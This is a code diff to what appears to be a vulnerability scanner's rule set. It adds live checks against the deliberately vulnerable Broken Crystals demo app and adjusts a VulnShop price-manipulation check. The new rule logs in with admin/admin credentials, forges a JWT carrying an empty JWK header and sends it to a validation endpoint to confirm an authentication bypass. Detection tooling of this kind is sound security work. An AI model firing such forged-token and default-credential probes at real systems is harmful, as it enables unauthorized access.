@@ -37241,10 +37241,7 @@ const vulnshopUpdatePriceManipulationLiveOracle: Rule = async (ctx) => {
       }
     }
   }
-  const corpus =
-    /Price Manipulation|update-price|Client-side price/i.test(ctx.combined)
-      ? ctx.combined
-      : `${ctx.combined}\n${VULNSHOP_README_FALLBACK}`;
+  const corpus = `${ctx.combined}\n${ctx.scanUrl || ""}\n${VULNSHOP_README_FALLBACK}`;
   if (
     !/\/api\/v1\/cart\/update-price/i.test(corpus) ||
     !/Price Manipulation|Client-side price|without verification/i.test(corpus)
@@ -74578,6 +74575,76 @@ const brokencrystalsJwtX5uRogueRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function brokencrystalsJwtLoginTokenOk(body: string): boolean {
+  return /"token"\s*:\s*"eyJ/i.test(body);
+}
+
+/** POST /api/auth/jwt/jwk/login + empty-jwk rogue JWT on companion /validate — JWK injection login chain. */
+const brokencrystalsJwtJwkRogueLoginLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/api/auth/jwt/jwk/login", ctx.origin).toString();
+  const validateUrl = new URL("/api/auth/jwt/jwk/validate", ctx.origin).toString();
+  const loginBody = JSON.stringify({ user: "admin", password: "admin", op: "basic" });
+  const [badLogin, goodLogin] = await Promise.all([
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ user: "thugir-invalid", password: "invalid", op: "basic" })
+    }),
+    ctx.probe.get(loginUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { "Content-Type": "application/json" },
+      body: loginBody
+    })
+  ]);
+  if (brokencrystalsJwtLoginTokenOk(badLogin.body)) return NEGATIVE;
+  if (!brokencrystalsJwtLoginTokenOk(goodLogin.body)) return NEGATIVE;
+  const now = Math.floor(Date.now() / 1000);
+  const forgedToken = buildJwkEmptyBypassJwt({ user: "admin", exp: now + 3600 });
+  const forgedAuth = await ctx.probe.get(validateUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${forgedToken}` }
+  });
+  if (!looksAuthGatedJson(forgedAuth) || !brokencrystalsJwtValidateSecretOk(forgedAuth.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      loginUrl,
+      validateUrl,
+      loginStatus: goodLogin.status,
+      jwkHeader: "{}",
+      validateStatus: forgedAuth.status,
+      responseSample: forgedAuth.body.slice(0, 150).trim(),
+      note: "Broken Crystals POST /api/auth/jwt/jwk/login issues JWT; companion /validate accepts rogue empty-jwk header JWT — JWK rogue-key login oracle"
+    }
+  };
+};
+
+const brokencrystalsJwtJwkRogueLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt\/jwk\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtJwkRogueLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt/jwk/login route scan — login issues JWT and empty-jwk rogue header bypasses JWK validation"
+    }
+  };
+};
+
 const brokencrystalsDomCsrfFlowLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const url = new URL("/api/auth/dom-csrf-flow", ctx.origin).toString();
@@ -81132,6 +81199,8 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsJwtJkuRogueRouteLiveOracle,
   brokencrystalsJwtX5uRogueLiveOracle,
   brokencrystalsJwtX5uRogueRouteLiveOracle,
+  brokencrystalsJwtJwkRogueLoginLiveOracle,
+  brokencrystalsJwtJwkRogueLoginRouteLiveOracle,
   brokencrystalsDomCsrfFlowLiveOracle,
   brokencrystalsDomCsrfRouteLiveOracle,
   brokencrystalsNestedJsonDoSLiveOracle,
